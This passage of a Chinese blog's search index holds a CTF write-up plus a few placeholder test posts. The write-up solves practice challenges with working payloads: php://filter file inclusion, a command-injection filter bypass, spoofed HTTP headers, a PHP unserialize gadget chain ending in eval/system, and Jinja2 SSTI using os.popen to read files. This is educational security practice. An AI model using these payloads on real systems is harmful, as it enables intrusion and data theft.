class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码：<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>php远程文件包含漏洞 base64加解密<br><span class="hljs-number">2</span>.解决方法<br>构造payload:file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>详情请参考博客:https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lilongsy/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">108146107</span><br>base64加解密百度在线网站即可<br></code></pre></td></tr></table></figure><h6 id="7-babeRCE"><a href="#7-babeRCE" class="headerlink" title="7.babeRCE"></a>7.babeRCE</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        system(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>命令执行漏洞绕过<br><span class="hljs-number">2</span>.解决方法<br>构造payload:rce=whoami可知直接通过过滤执行cat flag即可<br>百度常见绕过方式，可得<br>构造payload:rce=ca\t<span class="hljs-variable">$&#123;IFS&#125;</span>fla\g.php即可<br>详情请参考博客:https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/SpouseLJ/</span>p/<span class="hljs-number">13223967</span>.html<br><br></code></pre></td></tr></table></figure><h6 id="8-Do-you-know-HTTP"><a href="#8-Do-you-know-HTTP" class="headerlink" title="8.Do you know HTTP?"></a>8.Do you know HTTP?</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>http header<br><span class="hljs-number">2</span>.解决方法<br>网页发现给出三个提示<br><span class="hljs-number">1</span>)用<span class="hljs-string">&#x27;HS&#x27;</span>来请求试试？<br><span class="hljs-number">2</span>)只有本地ip地址才可以哦！<br><span class="hljs-number">3</span>)<span class="hljs-string">&#x27;LT&#x27;</span>才是本题官方浏览器哦！<br>利用bp抓包按需更改请求包为<br>HS <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>        Host: <span class="hljs-number">47.93</span>.<span class="hljs-number">215.154</span>:<span class="hljs-number">5002</span><br>        Cache-Control: max-age=<span class="hljs-number">0</span><br>        Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>        User-Agent: LT<br>        Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>        Accept-Encoding: gzip, deflate<br>        Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>        Connection: close<br>        X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>        Referer: www.ltyyds.com<br>        即可<br></code></pre></td></tr></table></figure><h6 id="9-eeeeeeeeeeezunserialize"><a href="#9-eeeeeeeeeeezunserialize" class="headerlink" title="9.eeeeeeeeeeezunserialize"></a>9.eeeeeeeeeeezunserialize</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">entrance</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;start = <span class="hljs-variable">$start</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;start-&gt;helloworld();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">springboard</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$middle</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;middle-&gt;hs;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$end</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;end = <span class="hljs-variable">$end</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$Attribute</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;end);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;serialize&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;serialize&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1.</span>考察知识<br>php魔方方法 php序列化/反序列化<br><span class="hljs-number">2.</span>解题方法<br><span class="hljs-number">1</span>)审查源代码可发现存在<span class="hljs-built_in">eval</span>()危险函数<br><span class="hljs-number">2</span>)分析代码逻辑及类名可知思路<br>entrance创建(销毁时调用springboard.call方法)-&gt;springboard创建-&gt;springboard.call调用创建evil方法-&gt;执行evil成员变量end=system(<span class="hljs-string">&#x27;cat flag&#x27;</span>);<br><span class="hljs-number">3</span>)利用phpstudy本地脚本输出<br>$payload = <span class="hljs-keyword">new</span> entrance(<span class="hljs-keyword">new</span> springboard(<span class="hljs-keyword">new</span> evil(<span class="hljs-string">&quot;system(&#x27;cat flag&#x27;);&quot;</span>)));<br>echo serialize($payload);<br>得到序列化后的payload:O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;entrance&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;springboard&quot;</span>:<span class="hljs-number">1</span>: &#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;middle&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;<br><span class="hljs-number">4</span>)get传入payload即可<br><span class="hljs-number">3.</span>思考<br><span class="hljs-number">1</span>)初做此题时看到源代码中调用不存在的方法和变量时，没有仔细思考导致未做出来,感谢@Ghost1032&amp;&amp;@CyXq指点<br><span class="hljs-number">2</span>)问:为什么根据本地更改后的php代码得到的payload可以用到原题中的php代码中？<br>答:序列化对象的时候，只会保存属性值。不保存常量的值，故无关<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">魔术方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><strong>__construct()</strong></td><td align="center"><strong>对象初始化时会调用此方法</strong></td></tr><tr><td align="center"><strong>__destruct()</strong></td><td align="center"><strong>对象销毁时会调用此方法</strong></td></tr><tr><td align="center"><strong>__get()</strong></td><td align="center"><strong>获取对象的属性为不允许访问/不存在，此方法会被调用</strong></td></tr><tr><td align="center"><strong>__call()</strong></td><td align="center"><strong>获取对象的方法为不允许访问/不存在，此方法会被调用</strong></td></tr></tbody></table><h6 id="10-让-我-访-问"><a href="#10-让-我-访-问" class="headerlink" title="10.让 我 访 问"></a>10.让 我 访 问</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">题目分析:<br>F12查看源码可看到有两个表单<br>&lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/login.do&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;/form&gt;<br>&lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/action&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;/form&gt;<br>由题目提示及高人指点可知register表单存在SSTI注入<br>之后进行测试即可<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">解题方法:</span><br><span class="xml">1)利用bp抓包register接口，发现传入post参数goto，更改goto值，发现页面存在回显注入</span><br><span class="xml">2)手动测试goto=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">3</span>*<span class="hljs-number">9</span>&#125;&#125;</span><span class="xml">,goto=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">3</span>*<span class="hljs-string">&#x27;9&#x27;</span>&#125;&#125;</span><span class="xml">,均回显27即可确定模板引擎为Jinja2</span><br><span class="xml">3)根据之前bugku所写相关题目Simple_SSTI_2套用payload模板</span><br><span class="xml">4)payload: </span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27ls</span>%<span class="hljs-number">20</span>../%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">ls当前文件夹所有文件</span><br><span class="xml">回显bin dev etc flag home lib lib64 media...</span><br><span class="xml">发现关键字眼flag</span><br><span class="xml">5)payload:</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27cat</span>%<span class="hljs-number">20</span>../flag%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">cat flag文件</span><br><span class="xml">即可得到flag</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">总结反思:</span><br>1)初拿到题目是判断为sql注入,没有考虑到题目提示且缺乏经验且不仔细审查源码,故没有找到注入点,经高人提示后才想起之前所写过的SSTI题目。<br>2)执迷于题目所给的WAF未遂导致无果。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/09/25/passage5/"/>
    <url>/2021/09/25/passage5/</url>
    
    <content type="html"><![CDATA[<p>第三篇测试文章，我好难…</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/passage6/"/>
    <url>/2021/06/10/passage6/</url>
    
    <content type="html"><![CDATA[<p>第四篇测试文章，我好难…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>我是火星人吗？？？</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试1</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
